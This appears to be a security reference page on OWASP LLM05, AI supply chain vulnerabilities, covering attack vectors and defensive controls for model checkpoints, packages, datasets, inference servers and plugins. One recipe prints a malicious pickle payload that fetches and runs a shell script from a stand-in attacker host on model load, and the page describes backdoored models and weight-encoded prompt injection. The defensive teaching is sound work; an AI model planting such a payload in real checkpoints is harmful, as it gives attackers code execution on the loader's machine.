# LLM05: Supply Chain Vulnerabilities

> OWASP LLM Top 10 2025 - LLM05
> Category: AI Security / OWASP-LLM-Top-10-2026
> Format: Two-track (Offensive / Defensive)

---

## 1. Overview

Supply chain vulnerabilities in AI systems are the class of risks that
come from components the operator did not build: pre-trained models,
fine-tuned checkpoints, training datasets, ML libraries, inference
servers, tokenizers, vector databases, plugins, and the model hubs
that distribute them. The operator trusts these components, and that
trust is the attack surface.

AI supply chains are wider and less mature than traditional software
supply chains. A model checkpoint is an opaque binary blob that may
contain code, and the format used to load it (pickle, joblib, Keras
HDF5) may execute arbitrary code during deserialization. A dataset
downloaded from a public hub may contain poisoned samples. A Python
package that wraps a model may have a malicious dependency. A plugin
that the model can call may be installed from a third-party registry
with no review.

The realistic attack surfaces:

- **Model hubs.** Public repositories of pre-trained models (Hugging
  Face, PyTorch Hub, TensorFlow Hub) host thousands of models, many
  unvetted.
- **Model serialization formats.** Pickle and joblib deserialization
  executes code. A malicious checkpoint is a remote code execution
  vector.
- **Datasets.** Public datasets can contain poisoned samples,
  backdoors, or PII.
- **Python packages.** The ML ecosystem (transformers, torch,
  langchain, llama-index) has a large transitive dependency tree.
- **Inference servers.** vLLM, TGI, Ollama, llama.cpp - each is a
  network service with its own vulnerabilities.
- **Plugins and tools.** Agent frameworks load plugins from
  third-party registries.
- **Tokenizer files.** A malicious tokenizer can inject tokens or
  cause denial of service.
- **Model weights as a hidden channel.** Weights can encode
  instructions that bypass a safety filter.

## 2. Reconnaissance / Enumeration

For an AI system you are assessing, map the supply chain:

- **What is the model provenance?** Internal training, fine-tuned
  from a public base, or downloaded from a hub?
- **What serialization format is used?** Pickle, joblib, safetensors,
  GGUF, ONNX. Pickle and joblib execute code; safetensors does not.
- **Which Python packages are installed?** Run pip freeze, look for
  outdated ML libraries with known CVEs.
- **Where do datasets come from?** Public hub, internal, scraped.
- **Which inference server is used?** vLLM, TGI, Ollama, Triton,
  llama.cpp. Check the version and known CVEs.
- **Which plugins can the model call?** Registry, source, version,
  last update.
- **Is there a model signature?** Are weights signed and verified
  at load time?

```text
Questions to ask during scoping:
- Which model checkpoint and which hub?
- Is the format pickle, joblib, or safetensors?
- Is the checkpoint signed and verified?
- Which ML packages and which versions?
- Which inference server and which version?
- Where do the datasets come from?
- Which plugins are installed and from where?
```

## 3. Common Attack Vectors

- **Malicious pickle checkpoint.** The attacker uploads a model to
  a public hub. When the operator loads it, the pickle deserialization
  executes the attacker code.
- **Typo-squatted Python package.** A package named transformerss,
  torchvisionn, or lang-chain installs malware or steals environment
  variables.
- **Dependency confusion.** An internal package name is published
  on PyPI. The build resolves to the public malicious version.
- **Backdoored base model.** A fine-tuned model inherits a backdoor
  from its base.
- **Poisoned dataset.** A public dataset contains samples designed
  to inject a behavior or bias.
- **Compromised inference server.** A vulnerability in the server
  (vLLM, TGI) gives remote code execution on the inference host.
- **Malicious plugin.** An agent framework plugin runs with the
  agent privileges and can exfiltrate secrets.
- **Malicious tokenizer.** A tokenizer can inject rare tokens that
  trigger a backdoor, or consume excessive memory.
- **Model hub account takeover.** The attacker compromises a
  publisher account and replaces a popular model with a backdoored
  version.
- **Weight-encoded prompt injection.** Instructions encoded in
  weights bypass text-level input filtering.

## 4. Exploitation Recipes

### 4.1 Malicious pickle checkpoint

A public hub model is loaded with torch.load without weights_only=True.
The pickle payload executes on load:

```python
import os, pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ("curl attacker.example/x|sh",))
pickle.dumps(Exploit())
```

When the operator calls torch.load("model.pt"), the payload runs.

### 4.2 Typo-squatted ML package

The attacker publishes transformerss (double s) on PyPI. A developer
mistypes the dependency name. The package runs a post-install script
that exfiltrates AWS credentials.

### 4.3 Dependency confusion

The internal build resolves an internal package name from PyPI
because no private index is configured. The attacker published a
higher version of the same name on PyPI.

### 4.4 Inference server RCE

A known vulnerability in a version of vLLM or TGI allows remote
code execution via a crafted request. The inference server is
often exposed on an internal network with no authentication.

## 5. Post-Exploitation

After a supply chain compromise, the attacker may:

- **Execute code on the inference host.** Full access to the model,
  the data, and any mounted secrets.
- **Steal API keys.** Cloud credentials, model provider keys, and
  internal service tokens are in environment variables.
- **Backdoor every model the operator fine-tunes.** The poison
  propagates to all downstream models.
- **Exfiltrate training data.** Weights can leak memorized data.
- **Poison the vector store.** A compromised embedding model
  produces poisoned vectors.
- **Pivot to other systems.** The inference host often has network
  access to data stores and internal APIs.

## 6. Preventive Controls (Defensive)

- **Prefer safe formats.** Use safetensors over pickle/joblib.
  If pickle is unavoidable, load with weights_only=True and only
  from a trusted, signed source.
- **Sign and verify model artifacts.** Sign checkpoints and datasets,
  verify the signature before load.
- **Pin dependencies.** Use lock files. Verify hashes. Use a private
  index with an allowlist.
- **SBOM for ML.** Maintain a software bill of materials for the
  model, the datasets, the packages, and the inference server.
- **Vet the model hub.** Prefer verified publishers, model cards,
  and known provenance.
- **Scan checkpoints.** Use tools that inspect pickle files for
  suspicious imports (e.g. fickling, picklescan) before load.
- **Isolate the inference server.** Run it in a sandbox, on a
  separate network, with no secrets in environment variables.
- **Review plugins.** Treat third-party plugins as untrusted code.
  Review the source, pin the version, run in a sandbox.
- **Rotate secrets.** Assume any secret in the inference host
  environment may be leaked.

## 7. Detection Controls (Defensive)

- **Log model loads.** Which checkpoint, which hash, which user.
- **Alert on pickle loads.** In production, a pickle load should be
  an exception that requires review.
- **Monitor pip installs.** Alert on installs of packages outside
  the allowlist, or with names close to popular packages.
- **Monitor outbound traffic from the inference host.** A model
  server should not be calling arbitrary external hosts.
- **Alert on model hash changes.** A checkpoint that changes hash
  without a version bump is suspicious.
- **Detect unusual resource use.** A malicious checkpoint may
  consume unusual memory or CPU at load.

## 8. Verification

- **Format check.** Confirm that production models are loaded from
  safetensors, or that pickle is loaded with weights_only=True.
- **Signature test.** Replace a model file with a modified version
  and confirm the load is rejected by signature verification.
- **Dependency test.** Install from a fresh environment and confirm
  the lock file pins every version and hash.
- **Sandbox test.** Try to reach the internet from the inference
  server; confirm the egress is blocked.
- **Plugin test.** Install a test plugin and confirm it cannot read
  environment variables or the filesystem outside its sandbox.
- **SBOM test.** Pick a random production model and trace every
  component to a source and version.

## 9. AI-Specific Considerations

- **Models are code.** A pickle checkpoint is executable. Treat
  every model file as untrusted code.
- **Hub trust is not verification.** A verified badge on a hub is
  not a security guarantee.
- **Model supply chains are immature.** Traditional supply chain
  tooling (SBOM, signing, provenance) is not yet standard in ML.
- **Fine-tuning inherits.** A backdoored base model contaminates
  every fine-tune.
- **Inference servers are network services.** They have their own
  CVE stream, often with slow patch cycles.
- **Plugin ecosystems are the new npm.** Agent frameworks are
  building registries without the security lessons learned in
  the JS ecosystem.

## 10. Production Notes

- **Immutable model artifacts.** Store models in a registry with
  content-addressed hashes.
- **No secrets in the inference environment.** Fetch secrets at
  request time from a vault, not from environment variables at
  server startup.
- **Private package index.** Mirror PyPI, allowlist packages,
  scan for malicious code before install.
- **Separate training from serving.** The training environment
  should never share credentials with the serving environment.
- **Patch the inference server.** Track CVEs for vLLM, TGI,
  Ollama, Triton, and other servers.
- **Document the SBOM.** Operators should be able to answer:
  which model, which dataset, which packages, which versions.

## 11. References

- OWASP LLM05: Supply Chain Vulnerabilities - https://genai.owasp.org/llmrisk/llm05-supply-chain-vulnerabilities/
- OWASP Top 10 for LLM Applications - https://owasp.org/www-project-top-10-for-large-language-model-applications/
- MITRE ATLAS - https://atlas.mitre.org/
- NIST AI RMF - https://www.nist.gov/itl/ai-risk-management-framework
- Safetensors format - https://huggingface.co/docs/safetensors/
